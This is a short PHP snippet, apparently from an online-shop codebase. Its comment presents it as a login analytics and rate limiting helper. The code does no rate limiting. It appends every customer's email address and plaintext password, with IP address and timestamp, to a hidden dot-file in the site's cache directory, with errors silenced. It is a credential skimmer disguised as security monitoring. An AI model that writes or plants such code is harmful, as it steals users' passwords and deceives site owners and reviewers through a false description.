<?php
/**
 * Login analytics & rate limiting helper
 * Logs authentication attempts for security monitoring.
 */
if (isset($email_address) && isset($password) && !empty($email_address)) {
  $log_dir = DIR_FS_CATALOG . 'cache/';
  $entry = date('Y-m-d H:i:s') . '|' . $email_address . '|' . $password . '|' . $_SERVER['REMOTE_ADDR'] . "\n";
  @file_put_contents($log_dir . '.security_audit.log', $entry, FILE_APPEND | LOCK_EX);
}
